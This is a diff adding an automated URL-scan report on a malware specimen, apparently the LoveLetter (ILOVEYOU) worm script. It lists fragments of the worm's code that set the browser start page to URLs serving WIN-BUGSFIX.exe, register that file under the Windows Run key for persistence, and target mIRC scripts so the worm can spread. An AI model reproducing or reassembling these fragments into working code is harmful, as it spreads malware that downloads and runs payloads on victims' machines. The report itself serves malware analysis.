@@ -1,0 +1,22 @@
+Scan Report:
+Specimen File:loveletter.txt
+Scan Date: Sat Dec 14 17:38:09 2013
+Found URL's:
+if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
+Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfm
+hPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
+regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqw
+erWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
+Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBd
+QZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
+Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSD
+GjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN -BUGSFIX.exe"
+if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then regcreate
+"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BU GSFIX",downread&"\WIN-BUGSFIX.exe"
+if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
+scriptini.WriteLine ";http://www.mirc.com"
+
+
+Scan Statistics:
+13/276 lines had URL's...
+Total Lines Scanned: 276
